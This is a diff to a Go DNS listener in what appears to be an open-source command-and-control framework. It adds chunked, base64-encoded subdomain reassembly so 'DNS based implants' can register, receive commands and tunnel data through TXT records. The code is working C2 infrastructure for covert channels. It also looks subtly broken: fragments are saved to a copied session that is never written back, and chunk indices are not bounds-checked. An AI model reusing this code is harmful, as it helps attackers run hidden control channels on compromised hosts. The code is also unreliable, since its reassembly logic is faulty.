@@ -10,11 +10,14 @@ import (
 	"strconv"
 	"encoding/json"
 	"errors"
+	"sync"
 
 	"github.com/InjectionSoftwareandSecurityLLC/lupo/lupo-server/core"
 	"github.com/miekg/dns"
 )
 
+
+var sessionsMu sync.RWMutex
 
 func DNSServerHandler(w dns.ResponseWriter, r *dns.Msg) {
 
@@ -36,37 +39,134 @@ func DNSServerHandler(w dns.ResponseWriter, r *dns.Msg) {
 	msg := new(dns.Msg)
 	msg.SetReply(r)
 
+	// For simplicity, handle only first TXT question
+	if len(r.Question) == 0 {
+		log.Println("No DNS question received")
+		return
+	}
 
-	var subdomainDecoded string
+	q := r.Question[0]
 
-	var name string
+	// Extract first label (subdomain) from query name
+	labels := strings.Split(q.Name, ".")
+	if len(labels) < 2 {
+		log.Printf("Invalid query name: %s", q.Name)
+		w.WriteMsg(msg)
+		return
+	}
 
-	for _, q := range r.Question {
-		if q.Qtype == dns.TypeTXT {
-			subdomainRaw := extractSubdomainPrefix(q.Name)
-			subdomainDecoded = decodeBase64(subdomainRaw)
-			//clientPayload := extractClientPayload(r)
+	subdomain := labels[0]
 
-			name = q.Name
-			/*
-			responseTxt := fmt.Sprintf("Decoded [%s]: %s", subdomainDecoded, clientPayload)
+	// Parse chunk metadata: sessionID-chunkIndex-totalChunks-chunkPayloadBase64
+	parts := strings.SplitN(subdomain, "-", 4)
+	if len(parts) != 4 {
+		log.Printf("Malformed chunked subdomain: %s", subdomain)
+		w.WriteMsg(msg)
+		return
+	}
 
-			rr := &dns.TXT{
-				Hdr: dns.RR_Header{
-					Name:   q.Name,
-					Rrtype: dns.TypeTXT,
-					Class:  dns.ClassINET,
-					Ttl:    60,
-				},
-				Txt: []string{responseTxt},
-			}
-			msg.Answer = append(msg.Answer, rr)
-			*/
+	// Parse sessionID
+	sessionID, err := strconv.Atoi(parts[0])
+	if err != nil {
+		log.Printf("Invalid sessionID in subdomain: %s", parts[0])
+		w.WriteMsg(msg)
+		return
+	}
+
+	// Parse chunk index
+	chunkIndex, err := strconv.Atoi(parts[1])
+	if err != nil {
+		log.Printf("Invalid chunkIndex in subdomain: %s", parts[1])
+		w.WriteMsg(msg)
+		return
+	}
+
+	// Parse total chunks
+	totalChunks, err := strconv.Atoi(parts[2])
+	if err != nil {
+		log.Printf("Invalid totalChunks in subdomain: %s", parts[2])
+		w.WriteMsg(msg)
+		return
+	}
+
+	chunkPayloadBase64 := parts[3]
+
+	// Lookup session from Sessions map (thread-safe sync.Map assumed)
+	sVal, ok := core.Sessions.Load(sessionID)
+	if !ok {
+		log.Printf("Unknown sessionID %d", sessionID)
+		w.WriteMsg(msg)
+		return
+	}
+	session := sVal.(core.Session)
+
+	// Lock session mutex to safely update fragments
+	sessionsMu.Lock()
+
+	defer sessionsMu.Unlock()
+
+	// Ensure SubDomainFragments slice is properly sized in the session
+	if len(session.SubDomainFragments) < totalChunks {
+		frags := make([]string, totalChunks)
+		copy(frags, session.SubDomainFragments)
+		session.SubDomainFragments = frags
+	}
+
+	// Store chunk at the correct index in the session
+	session.SubDomainFragments[chunkIndex] = chunkPayloadBase64
+
+	log.Printf("Received chunk %d/%d for session %d", chunkIndex+1, totalChunks, sessionID)
+
+	// Check if all chunks received (no empty strings)
+	allReceived := true
+	for _, frag := range session.SubDomainFragments {
+		if frag == "" {
+			allReceived = false
+			break
 		}
 	}
 
-	err := json.Unmarshal([]byte(subdomainDecoded), &dnsParams)
+	if !allReceived {
+		// Respond with acknowledgment TXT to confirm chunk received
+		rr := &dns.TXT{
+			Hdr: dns.RR_Header{
+				Name:   q.Name,
+				Rrtype: dns.TypeTXT,
+				Class:  dns.ClassINET,
+				Ttl:    60,
+			},
+			Txt: []string{"chunk received"},
+		}
+		msg.Answer = append(msg.Answer, rr)
+		w.WriteMsg(msg)
+		return
+	}
 
+	// All chunks received - join and decode full message
+	fullBase64 := strings.Join(session.SubDomainFragments, "")
+	jsonBytes, err := base64.RawURLEncoding.DecodeString(fullBase64)
+	if err != nil {
+		log.Printf("Failed to decode base64 full message for session %d: %v", sessionID, err)
+		// reset fragments to allow retransmit
+		session.SubDomainFragments = nil
+		w.WriteMsg(msg)
+		return
+	}
+
+	// Parse JSON message into dnsParams struct
+	err = json.Unmarshal(jsonBytes, &dnsParams)
+	if err != nil {
+		log.Printf("Failed to unmarshal JSON for session %d: %v", sessionID, err)
+		// reset fragments to allow retransmit
+		session.SubDomainFragments = nil
+		w.WriteMsg(msg)
+		return
+	}
+
+	// Clear fragments for next message
+	session.SubDomainFragments = nil
+
+	// Now proceed with your existing logic for dnsParams:
 
 	if err != nil {
 		core.LogData("error: Problem occurred while parsing input from a DNS based implant")
@@ -119,16 +219,16 @@ func DNSServerHandler(w dns.ResponseWriter, r *dns.Msg) {
 				core.ErrorColorBold.Println(errorString)
 			}
 
-			fmt.Println(string((jsonResp)))
+			encodedJSONResp := base64.RawURLEncoding.EncodeToString(jsonResp)
 
 			rr := &dns.TXT{
 				Hdr: dns.RR_Header{
-					Name:   name,
+					Name:   q.Name,
 					Rrtype: dns.TypeTXT,
 					Class:  dns.ClassINET,
 					Ttl:    60,
 				},
-				Txt: []string{string(jsonResp)},
+				Txt: []string{encodedJSONResp},
 			}
 			msg.Answer = append(msg.Answer, rr)
 
@@ -137,7 +237,6 @@ func DNSServerHandler(w dns.ResponseWriter, r *dns.Msg) {
 			core.BroadcastSession(strconv.Itoa(newSession))
 
 			return
-
 		}
 	} else {
 		errorString := "DNS Request Invalid PSK, request ignored"
@@ -147,8 +246,8 @@ func DNSServerHandler(w dns.ResponseWriter, r *dns.Msg) {
 		return
 	}
 
-
-	sVal, ok := core.Sessions.Load(dnsParams.SessionID)
+	// Look up session again by SessionID from dnsParams after registration logic
+	sVal, ok = core.Sessions.Load(dnsParams.SessionID)
 
 	if !ok {
 		// Session missing
@@ -178,7 +277,7 @@ func DNSServerHandler(w dns.ResponseWriter, r *dns.Msg) {
 
 			rr := &dns.TXT{
 				Hdr: dns.RR_Header{
-					Name:   name,
+					Name:   q.Name,
 					Rrtype: dns.TypeTXT,
 					Class:  dns.ClassINET,
 					Ttl:    60,
@@ -201,8 +300,7 @@ func DNSServerHandler(w dns.ResponseWriter, r *dns.Msg) {
 		}
 	}
 
-	session := sVal.(core.Session)
-
+	session = sVal.(core.Session)
 
 	if session.Implant.ID != dnsParams.UUID || dnsParams.UUID == core.ZeroedUUID {
 		if core.PersistenceMode {
@@ -231,7 +329,7 @@ func DNSServerHandler(w dns.ResponseWriter, r *dns.Msg) {
 
 			rr := &dns.TXT{
 				Hdr: dns.RR_Header{
-					Name:   name,
+					Name:   q.Name,
 					Rrtype: dns.TypeTXT,
 					Class:  dns.ClassINET,
 					Ttl:    60,
@@ -282,7 +380,6 @@ func DNSServerHandler(w dns.ResponseWriter, r *dns.Msg) {
 		}
 	}
 
-
 	var cmd string
 	var user string
 
@@ -309,7 +406,7 @@ func DNSServerHandler(w dns.ResponseWriter, r *dns.Msg) {
 
 	rr := &dns.TXT{
 		Hdr: dns.RR_Header{
-			Name:   name,
+			Name:   q.Name,
 			Rrtype: dns.TypeTXT,
 			Class:  dns.ClassINET,
 			Ttl:    60,
@@ -320,31 +417,4 @@ func DNSServerHandler(w dns.ResponseWriter, r *dns.Msg) {
 
 	w.WriteMsg(msg)
 
-	w.WriteMsg(msg)
-}
-
-func extractSubdomainPrefix(name string) string {
-	parts := strings.Split(name, ".")
-	if len(parts) > 0 {
-		return parts[0] // First label (subdomain)
-	}
-	return "unknown"
-}
-
-func decodeBase64(input string) string {
-	decoded, err := base64.RawURLEncoding.DecodeString(input)
-	if err != nil {
-		log.Printf("⚠️ Failed to decode base64 subdomain '%s': %v", input, err)
-		return "(invalid base64)"
-	}
-	return string(decoded)
-}
-
-func extractClientPayload(r *dns.Msg) string {
-	for _, extra := range r.Extra {
-		if txt, ok := extra.(*dns.TXT); ok {
-			return strings.Join(txt.Txt, " ")
-		}
-	}
-	return "(no payload)"
 }
